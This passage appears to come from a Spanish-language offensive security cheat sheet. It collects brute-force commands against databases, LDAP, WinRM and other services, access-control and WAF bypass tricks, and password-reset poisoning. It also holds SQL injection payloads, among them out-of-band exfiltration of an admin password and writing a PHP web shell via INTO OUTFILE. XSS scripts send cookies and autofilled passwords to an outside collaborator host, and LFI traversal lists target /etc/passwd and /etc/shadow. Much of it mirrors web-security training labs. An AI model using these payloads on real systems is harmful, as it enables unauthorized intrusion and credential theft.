medusa medusa -h 192.168.1.2 -u admin -P wordlist.lst -M mssql
```

```bash
potator mssql_login host=10.0.0.1 user=sa password=FILE0 0=passwords.txt -x ignore:fgrep='Login failed for user'
```

### PgSQL
```bash
potator pgsql_login host=10.0.0.1 user=postgres password=FILE0 0=passwords.txt -x ignore:fgrep='password authentication failed'
```

### LDAP Bruteforce
```bash
kerbrute bruteuser -d evil.corp --dc 10.10.10.19 rockyou.txt Administrator #Password brute
```

```bash
kerbrute userenum -d evil.corp --dc 10.10.10.19 users.txt #Username brute
```

```bash
kerbrute passwordspray -d evil.corp --dc 10.10.10.19 users.txt rockyou.txt #Password spray
```

```bash
potator ldap_login host=10.0.0.1 binddn='cn=FILE0,dc=example,dc=com' 0=logins.txt bindpw=FILE1 1=passwords.txt -x ignore:mesg='ldap_bind: Invalid credentials (49)' ssl=1 port=636
```

### Winrm Login bruteforce
```bash
crackmapexec winrm x.x.x.x -u user.txt -p pass.txt --continue-on-success
```

### AJP
```bash
potator FALTA_COMPLETAR
```

### Telnet
```bash
potator telnet_login host=10.0.0.1 inputs='FILE0\nFILE1' 0=logins.txt 1=passwords.txt \
    prompt_re='tux login:|Password:' -x reset:egrep!='Login incorrect.+tux login:'
```

### SMTP
```bash
potator smtp_login host=10.0.0.1 helo='ehlo its.me.com' user=FILE0@dom.com password=FILE1 0=logins.txt 1=passwords.txt
```

### VNC
```bash
vnc_login host=10.0.0.1 password=FILE0 0=passwords.txt --threads 1 -x retry:fgrep!='Authentication failure' --max-retries -1 -x quit:code=0
```

# Analisis de trafico

## Wireshark

## tShark

## Decoders Hex packets

* [Hex Dump Decoder](sadjad.me/phd/)
* [Packetor](http://packetor.com/)
* [Gasmi](https://hpd.gasmi.net/)

# Web Hacking

## Reverse Proxys

* ZAP
* Burpsuite

### Complementos
```
Collaborator Everywhere -> scan con collaborator en las url del scope
```

### Corriendo Macros en Burpsuite
```
Project Options -> Sessions -> Sessions Handling rules -> Add
bajo Scope -> include all urls
bajo Details -> Rule Actions -> Add -> Run a Macro -> Add
Seleccionar en orden las consultas que se quieren usar

Se pueden manejar parametros de esta forma
Seleccionar request -> Configure Item -> Add -> Seleccionar valor y llamarlo IGUAL que el parametro de la proxima request
Seleccionar request 2 -> Configure Item -> parametro que queremos poner -> derivado de request anterior
Test Macro para saber si funciona4

Vamos al Intruder -> ponemos una request cualquiera con sniper attack, Null Payloads y un thread
```

### Reglas de procesamiento para Intruder
```
Options -> Payload Processing -> poner las reglas en orden
```

## Requests

### Curl
```bash
curl -A 'User Agent' www.url.com
curl -X POST www.url.com #metodos soportados: POST, HEAD, PUT, GET, DELETE

curl -s #asi no imprime basura
curl -H "HEADER" www.url.com
curl -u username:password www.url.com
curl www.url.com -cookie "variable=value"
#falta seguro informacion sobre cookies
```

## Bypassing

### Codes

#### Tools

* [Bypass403](https://github.com/iamj0ker/bypass-403)
* [dontgo403](https://github.com/devploit/dontgo403)

#### Headers
```
# usar IP autorizada
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-IP: 127.0.0.1
```

```
/admin -> forbidden

GET / HTTP/1.1
X-Original-URL: /admin

# Pasando campos
GET /?id=1
X-Original-URL: /admin
```

```
GET /api/users --> forbidden

GET / HTTP/1.1
Host: site.com
Referer: https://site.com/api/users

GET /api/users HTTP/1.1
Host: site.com
Referer: https://site.com/api/users
```

```
# se puede cambiar de un metodo a otro para ver si alguno pasa
POST /admin/user-role-change -> 401 Unauthorized
POSTX /admin/user-role-change -> 200 / missing parameter
GET /admin/user-role-change?parameter=x -> 200
```

```
DELETE /user/1234 #forbidden

DELETE /user/[1234]
DELETE /user/{"id":"1234"}
DELETE /v1/user/1234
DELETE /v2/user/1234
DELETE /v3/user/1234
```

#### APIs

```
https://site.com/api/v1/users/reactid #denegado
# posibles bypass
https://site.com/api/v1/users/redactid.json
https://site.com/api/v1/users/redactid?
https://site.com/api/v1/users/redactid??
https://site.com/api/v1/users/redactid.. ;/
https://site.com/api/v1/users/redactid\..\.\getUsers
https://site.com/api/v1/users/redactid/
https://site.com/api/v2/users/redactid
https://site.com/api/v1/users/redactid&accountdetails
https://site.com/api/v1/users/redactid&accountdetails=redactid
https://site.com/api/v1/users/redactid/email

# Con ids separados
https://site.com/api/v1/users/yourid&victimid

https://site.com/api/v1/users/victim?id=ASDASDASD #denegado
https://site.com/api/v1/users/your?id=FWFEWFEWFEW&victim?id=ASDASDASD #permitido

```

### WAFs

#### Caracteres unicode equivalentes
```
Ejemplo: punto (.) estaba bloqueado asi que usar un caracter unicode equivalente (%E3%80%82) (punto chino), podria llegar a estar sin filtrar/bloquear.
```
Buscar equivalentes en: [Compart](https://compart.com/en/unicode)

## API Keys

### Probar si una key es funcional

* [keyhacks](https://github.com/streaak/keyhacks)
* [key-checker](https://github.com/daffainfo/Key-Checker)

### Probar API de Google Maps
```
https://github.com/ozguralp/gmapsapiscanner
```

### Encontrar a quÃ© pertenece esta API Key - Token
```
https://api-guesser.netlify.app/
```

## Logica

### High-level Logic (Portswigger)
```
# Si podemos usar una request para sacar del carrito de compras
# se intenta llegar a un numero negativo de un producto
# Si el precio tambien es negativo, se puede usar para generar
# descuentos para la compra de otros productos.
```

### Low-Level Logic (Portswigger)
```
# Llevamos la compra de un articulo hasta un valor enorme para que
# genere un Integer Overflow y pase de positivo a negativo luego
# de un cierto numero de productos con el Intruder
# Despues de eso, se agrega una cierta cantidad de productos
# para pasar ese numero a un numero positivo
```

### Insufficient Workflow Validation (Portswigger)
```
# Agregar producto a carrito
# /cart/order-confirmation?order-confirmation=true -> forzar la confirmacion de la compra
```

### Flawed Enforcement of Business Rules (Portswigger)
```
# Si tenemos dos cupones, aplicarlos intercaladamente para ver si funcionan infinitamente
# Cupon A -> Cupon B -> Cupon A -> Cupon B -> ...
```

## Information Disclosure
```
revisar cabeceras
disparar errores
revisar archivos comunes como /robots.txt / sitemap.xml
Listar directorios
Descargar /.git si existe y revisar los archivos
```

### Github
```
wget -r http://example.com/.git
cd example.com/
git log #ver los commits
git diff <commit> #vamos a ver ediciones anteriores
```

### Metodos HTTP
```
GET /admin -> TRACE /admin
Puede darnos mas informacion
```

## Funcionalidad de Password Reset
```
email=victim@x.y&email=hacker@x.y
email=victim@x.y%0a%0dcc:hacker@x.y
email=victim@x.y,hacker@x.y
email=victim@x.y%20hacker@x.y
email=victim@x.y|hacker@x.y
email=victim
email=victim@x.y
{"email":["victim@x.y","hacker@x.y"]}
```

## Auth

### User Enumeration
```
Buscar por diferentes respuestas
Request usuario_correcto -> "Password incorrecta" / Request usuario_incorrecto -> "Usuario Incorrecto"

Buscar por diferencias sutiles en la respuesta
Usando Intruder -> Options -> Grep - Extract -> Add -> Agregar la respuesta al usuario incorrecto
Lanzar el ataque y fijarse si existe alguna diferencia

Buscar diferentes tiempos de respuesta
Luego de usar el intruder -> Columns -> Response Received y Response Completed
Para confirmar lanzar el ataque una o dos veces mas

Buscar por account lock
Usar Cluster Bomb -> username=%diccionario%,password=incorrecta%null_payload% -> Generar 5 payloads
Los mensajes pueden ser diferentes > bloquear la cuenta si existe, no hacer nada si no existe
```

### Bruteforcing
```
Podemos intentar bypassear la proteccion haciendo una request correcta, una con intento de adivinar
Pitchfork + user/pass diccionarios que se intercalen las correctas con las incorrectas
```

### Bruteforcing Stay Logged Cookie
```
Si existe una stay logged cookie podemos encontrar la forma de cifrado e intentar bruteforcearla

Tambien se puede intentar robarla con XSS a otro usuario y bruteforcearla offline
```

### Bypassing Bruteforcing Protections
```
Se puede agregar la cabecera
X-Forwarded-For: 192.168.0.1 y modificar el numero cada intento
Se puede usar el ataque Pitchfork con Intruder
```

### Multiples credenciales por request
```
Si tiene json se puede intentar mandar multiples passwords en una request
{"username":"admin","password":["123456","administrator"],":"}
```

### Password Reset Poisoning
```
En la funcionalidad de reset password, si acepta la cabecera X-Forwarded-Host, se puede agregar
X-Forwarded-Host: evil.host.com
y puede enviar el token de cambio de password a este host
```

### Password Reset Poisoning 2
```
En la funcionalidad de cambio de password, si cambiamos la cabecera Host a una cualquiera, y la funncionalidad
sigue en orden, se puede poner un dominio como el del collaborator y modificar que usuario queremos modificar, y 
llegariamos a recibir el token de cambio de password de otro usuario
```

### Password Reset Poisoning 3
```
Si podemos modificar el Host al pedir el cambio de pass pero solo agregandole el puerto:
Host: realhost.com:443
Entonces podemos intentar inyectar markup y cambiar el campo del username a la victima
Host: realhost.com:'<a href="//evil.host.com/?

Nos enviaria el Token de cambio de pass al host del atacante
```

### Password Bruteforcing via password change
```
Supongamos que tenemos un endpoint /password para cambiar la pass, que nos pide los siguientes datos
username=wiener&current-password=123456&new-password-1=peter&new-password-2=peter1
Si current-password es correcto, nos envia un mensaje de que las pass no coinciden
Si current-password es incorrecto, nos envia un mensaje de que la pass actual no es correcta

Se puede usar esta informacion, con otros usernames, para bruteforcear la pass en current-pass
Cuando current-pass sea la correcta, nos envia un mensaje de que las pass nuevas no coinciden
```


### 2FA Broken Logic (Portswigger)
```
# Flujo
post /login (user & pass) -> get /login2 (pide pin code)-> post /login2 (POST pin code)
# Paso 1
Get /login2 (cambio parametro para pedir un pin para user victima)
# Paso 2
Get /login (inicio sesion con un usuario legitimo)
# Paso 3
Post /login2 (envio una consulta con un pin equivocado
# Paso 4
Post /login2 (intruder bruteforce el pin + verificar al user victima)
```

### 2FA Simple Bypass
```
/login -> creds simples.
/login2 -> pide 2FA (no lo ponemos y vamos directamente al portal del usuario)
/my-account
```

## IDOR
```
https://vulnerable.com/algo/algo/self/algo -> https://vulnerable.com/algo/algo/{Reemplazar_por_ID}/algo
https://vulnerable.com/{ID_Victima} (Forbidden) -> https://vulnerable.com/{ID_Victima}/ (200 OK)
https://vulnerable.com/{ID_Victima} (Forbidden) -> https://vulnerable.com/{ID_Victima}%00 (fuzzear hasta %ff)
```


## File upload

### Tips & Tricks
```
/?file=xx.php    <-- Blocked
/?file===xx.php  <-- Bypassed
```

## SQLi

### Inyecciones segun DDBB

* [MySQL](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/Inyeccion_por_DDBB.md#mysql)
* [MSSQL](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/Inyeccion_por_DDBB.md#mssql)
* [Oracle](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/Inyeccion_por_DDBB.md#oracle)
* [PostgreSQL](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/Inyeccion_por_DDBB.md#postgresql)

### Boolean SQLi

[Boolean SQLi](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/Boolean_SQLi.md)

### Login bypass
```
user: administrador'--
pass: esto_no_importa
```

### Numero de columnas

Inyectar hasta que nos de numero de error de columna
```
1' ORDER BY 1 --+
1' ORDER BY 2 --+
# otra opcion
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
# Recordar que para Oracle hay que usar la tabla dual
1' UNION SELECT NULL FROM DUAL--
```
Cantidad de columnas final: numero de error - 1

### UNION SELECT

Usamos la cantidad de columnas que conocemos
```
1' UNION SELECT 1,2,3,4 --+
```
Nos tiene que mostrar numeros. Esos numeros son las columnas vulnerables
Buscamos la columna inyectable si no
```
1' UNION SELECT 'a',NULL,NULL,NULL--
1' UNION SELECT NULL,'a',NULL,NULL--
1' UNION SELECT NULL,NULL,'a',NULL--
1' UNION SELECT NULL,NULL,NULL,'a'-- 
```
Listamos contenidos de la base de datos
```
# Tablas
1' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--
# Oracle
1' UNION SELECT table_name,NULL FROM all_tables--

# Columnas
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
# Oracle
1' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# Info
1' UNION SELECT columna1,NULL FROM users--
# Oracle
' UNION SELECT USERNAME_column,PASSWORD_column FROM USERS--
```

### Blind SQLi

#### Respuestas condicionales
```
# Portswigger ejemplo
cookie: TrackingId=asd
# Te fijas si tiene respuestas diferentes
Cookie: TrackingId=asd' AND '1'='1
Cookie: TrackingId=asd' AND '1'='2
# Buscamos si existe una tabla llamada 'users' buscando el resultado de la respuesta del TRUE
Cookie: TrackingId=asd' AND (SELECT 'a' FROM users LIMIT 1)='a
# Buscamos un nombre de usuario (administrator)
Cookie: TrackingId=asd' AND (SELECT 'a' FROM users WHERE username='administrator')='a
# Buscamos el largo de la password
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
# Buscamos cada letra de la contra con
# Se puede usar el intruder en 'a' para poder sacar cada parte de la pass
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
# Seguis con la proxima letra cambiando el offset
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

#### Errores condicionales
```
# Portswigger ejemplo
Cookie: TrackingId=asd
# Te fijas si generas un error
Cookie: TrackingId=asd'
# Y ahora deberia volver a la normalidad
Cookie: TrackingId=asd''
# Hacemos la query como substring
Cookie: TrackingId=asd'||(SELECT '' FROM dual)||' # En este caso "from dual" se usa porque es una ddbb Oracle
# Podemos buscar nombre de la tabla haciendo una consulta asi
Cookie: TrackingId=asd'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
# Podemos hacer consultas condicionales que si recibimos errores entonces es que la condicion se cumple
Cookie: TrackingId=asd'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
# Podemos buscar cuantas letras tiene la pass de un usuario
Cookie: TrackingId=asd'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
# Ahora buscamos cada letra de la pass. Podemos usar Intruder
Cookie: TrackingId=asd'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Cookie: TrackingId=asd'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

#### Time delays
```
# Portswigger ejemplo
# Primero validamos el sqli
Cookie: TrackingId=asd'||pg_sleep(10)--
# Armamos el condicional
Cookie: TrackingId=asd'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
# Podemos verificar el username
Cookie: TrackingId=asd'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# Cuantos caracteres de largo el pass
Cookie: TrackingId=asd'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
# Sacamos cada letra de la pass
# Para usar el intruder, usamos un thread y en columns -> response received para poder ver el tiempo de rta
Cookie: TrackingId=asd'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
Cookie: TrackingId=asd'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

#### Out-of-band (OAST)
```
# Cuando el parametro o cookie inyectable es asincronico, podemos comprobarlo con un dnslookup
# En este caso, aprovecha tambien un XXE
Cookie: TrackingId=asd'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
# Se puede mandar una pass por ejemplo hacia el collaborator mediante el subdominio de la request
Cookie: TrackingId=asd'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Extraer Informacion

Inyectamos en las columnas vulnerables
```
1' UNION SELECT 1,2,3,schema_name from information_schema.schemata--+

@@DATADIR -> directorio de la ddbb
@@version -> version de la ddbb
user() -> usuario que tenemos
system_user() -> usuario que tenemos
user from mysql.user -> lista todos los usuarios
database() -> nos muestra cual es la ddbb en la que estamos
schema_name FROM information_schema.schemata -> lista las ddbb
table_schema,table_name FROM information_schema.tables WHERE table_schema != â€˜mysqlâ€™ AND table_schema != â€˜information_schemaâ€™ -> Nos muestra las tablas de la ddbb elegida


table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != â€˜mysqlâ€™ AND table_schema != â€˜information_schemaâ€™ -> las columnas de la tabla elegida
```

### Devolviendo informacion oculta
```
https://url.com/?categoria=productos&ocultos=0
?categoria=productos' or 1=1--
```

### SQLi bypass

#### Usando URL encode
```
Signo de suma (+)
Espacio encodeado (%20)
Null Byte (%00)
Nueva linea (%0a)
Tabulacion (%09)
Carriage return (%0d)
%53elect
```

#### Usando comentarios
```
SEL/**/ECT
```

#### May y Min
```
UniOn SeleCt
```

#### Hexa
```
/%2A%2A/union/%2A%2A/select/%2A%2A/1
%2F**%2Funion%2F**%2Fselect%2F**%2F1
```

#### Sounds Like

Para reemplazar el simbolo '='
```
where table_schema sounds like database()
```

#### Reverse
```
Select reverse(reverse(table_Name)) from information_schema.tables
```

### SQLi a LFI
```
UNION ALL SELECT LOAD_FILE(â€˜/etc/passwdâ€™) -> LFI
```

### SQLi a RCE
```
creamos un archivo nombre.php al que le metemos:
'<?php system($_GET["cmd"]); ?>'

Inyectamos el payload SQL:
union+select+1,'load_file(â€˜/etc/passwdâ€™)',3+INTO+OUTFILE+'ruta/nombre.php'+--+

Y ejecutamos la shell con:
http://url.com/nombre.php?=ls
```

### SQLi a XSS reflejado
```
Payload XSS: <script>alert(1)</script>
Lo pasamos a hex: 3C7363726970743E616C6572742831293C2F7363726970743E
Inyectamos donde deberia estar la consulta de la columna vulnerable + 0x al inicio:
http://www.url.com/?id=1' union select 1,2,3,4,0x3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11 --+
```

### SQLi a XSS Persistente

creamos un html con nuestro payload
```
union+select+1,'<script>alert(1)</script>',3+INTO+OUTFILE+'ruta/nombre.html'+--+
```

### SQLMap
```bash
#databases
$sqlmap -u www.url.com/?id= --dbs --user-agent="Opera"
#tablas
$sqlmap -u www.url.com/?id= -D database_name --tables --cookie="security=low; PHPSESSID=blablabla" 
#columnas
$sqlmap -u www.url.com/?id= -D database_name -T table_name --columns
#dump
$sqlmap -u www.url.com/?id= -D database_name -T table-name -C user,password --dump
```

## XSS

### Tips & Tricks

FALTA ORDENAR
```
http(s):// can be shortened to // or /\\ or \\.

document.cookie can be shortened to cookie. It applies to other DOM objects as well.

alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()

You can use // to close a tag instead of >.

I have found that confirm is the least detected pop-up function so stop using alert.

Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use <script src=//14.rs> instead of <script src="//14.rs">

El script mas corto de XSS es <script src=//14.rs> (19 chars)
```

### Evaluador CSP

[Link](https://csp-evaluator.withgoogle.com/)

### XSSer
```bash
XSSer #suite
```

[XSSer Github](https://github.com/epsylon/xsser)

### Payloads XSS

* [XSS Doc](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/XSS%20Payloads.md)
* [XSS Doc2](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/XSS%20Payloads%202.md)
En esta web hay Payloads mas complejos
* [XSS-Payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)

### Escaneando tags
```
1) Con payload <Â§Â§> mandamos al intruder y agregamos lista de tags. Vemos cual no nos tira error
# Ejemplo: body
2) Con payload <body%20Â§Â§=1> mandamos al intruder y agregamos lista de events

3) exploit 
```

### XSS reflejado con todos los tags bloqueados salvo los custom
```
https://vulnerable.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x
```

### XSS - Robando cookies
```
# en un comentario
<script>
fetch('https://burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 
```

### XSS - Robando passwords aprovechandose del autofill
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"> 
```

### XSS + CSRF - Cambiando correos
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script> 
```

### XSS + XHR - Cambiando contraseÃ±as (ejemplo con Multipart)
```
function get_token(response){
  html_parser = new DOMParser();html = html_parser.parseFromString(response, "text/html");
  html = html_parser.parseFromString(response, "text/html");
  token = html.getElementById('edit_field_form_token').value;
  console.log("Token: "+token)
  return token;
}

function edit_user()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://test.com/account/edit", false);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");

        xhr.withCredentials = true;

        xhr.send(null);

        token = get_token(xhr.responseText);
        change_password(token);

      }

function change_password(token)
{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://test.com/account/save", true);
  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------175298846921575576723431440950")
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.withCredentials = true;
  var body = '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="id"\r\n\r\n' +
         '29592\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="firstname"\r\n\r\n' +
         'hercu\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="lastname"\r\n\r\n' +
         'les\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="username"\r\n\r\n' +
         'hercules\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="email"\r\n\r\n' +
         'correo@cualquiera.com\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="password"\r\n\r\n' +
         'PASSWORD\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="repeat_password"\r\n\r\n' +
         'PASSWORD\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="form_token"\r\n\r\n' +
         token + '\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="status"\r\n\r\n' +
         '1\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="next_action"\r\n\r\n' +
         'apply\r\n' +
         '-----------------------------175298846921575576723431440950\r\n' +
         'Content-Disposition: form-data; name="prev_form"\r\n\r\n' +
         '[{"name":"prev_form","value":""},{"name":"next_action","value":""},{"name":"status","value":"1"},{"name":"form_token","value":"'+ token+'"},{"name":"password","value":""},{"name":"repeat_password","value":""},{"name":"email","value":"correo@cualquiera.com"},{"name":"username","value":"hercules"},{"name":"lastname","value":"les"},{"name":"firstname","value":"hercu"},{"name":"id","value":"29592"}]\r\n' +
         '-----------------------------175298846921575576723431440950--\r\n';
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  xhr.send(new Blob([aBody]));
  console.log("Done!")
}

edit_user();
```

### DOM XSS en AngularJS
```
{{$on.constructor('alert(1)')()}}
```

### Evasion de filtros

#### XSS in SVG
```bash
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<script type="text/javascript">
		alert(document.cookie);
	</script>
</svg>
```

#### XSS en XML
```bash
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://www.w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

#### Some payloads (esto hay que ordenarlo)
```bash
#XSS in filename
><img src=x onerror=alert(document.cookie)>.png

#XSS bypass using urlencode
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">

#XSS using eval() and fromCharCode
<img onload="javascript:alert(String.fromCharCode(97,108,101,114,116,40,39,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,39,41,59))">

#XSS in hidden input
<input type="hidden" accesskey="X" onclick="alert(1)">
##Use CTRL+SHIFT+X to trigger the onclick event

#Polyglot XSS
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``><?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```

## LFI

### Tools

#### fdsploit
```bash
fdsploit.py -u www.url.com/lfi.php?id=1 -c 'cookie'
```

#### fimap
```bash
fimap -u www.url.com â€”cookie='cookie' 
```

#### kadimus
```bash
#ejecutando PHP
kadimus -u www.url.com/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -T input
#ejecutando comando
kadimus -t localhost/?pg=/var/log/auth.log -T auth -c 'ls -lah' --ssh-target localhost
```

#### lfisuite
```bash
lfisuite.py #framework scan and exploit
```

### Manual
```
#basic
http://example.com/index.php?page=/etc/passwd
http://example.com/index.php?page=../../etc/passwd

#A donde apuntar
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
./index.php
././index.php
.//index.php
../../../../../../etc/passwd
../../../../../../etc/passwd%00
....//....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e/%252e/etc/passwd
ï¼®ï¼®/ï¼®ï¼®/ï¼®ï¼®/etc/passwd
.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd
static\..\..\..\..\..\..\..\..\etc\passwd
```

### Bypassing

#### Validacion de Path
```
http://example.com/index.php?page=/var/www/images/../../../etc/passwd
```

#### Comunes
```
../\
..\/
/..
\/..
/%5c..
```

#### Null Byte
```
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=../../../etc/passwd%00.png
```

#### URL Encoding
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### UTF-8 Encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

#### Escaping
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

#### Path Truncation
```
##En PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.

#Checkear si los ultimos 6 chars son passwd --> passwd/
#Checkear si los ultimos 4 chars son ".php" --> shellcode.php/.
#En la mayoria de las instalaciones de PHP el nombre de un archivo de 
#mas de 4096 bytes son cortados.
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

#### PHP b64
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=../../etc/passwd
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=../../etc/passwd
```

#### ROT13
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=../../etc/passwd
```

#### Compresion
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

#Para leerlo, ejecutar esto en nuestra consola PHP
readfile('php://filter/zlib.inflate/resource=test.deflated');
```

#### Bypass Chrome Auditor
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## RCE

### LFI a RCE

#### PHP Session
```
#Check if the website use PHPSESSID
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=True, 30-Jun-2020 10:25:29 GMT; path=/; httponly

#En PHP las sesiones se guardan en /var/lib/php5/sess_PHPSESSID o en /var/lib/php/session/sess_[PHPSESSID] files
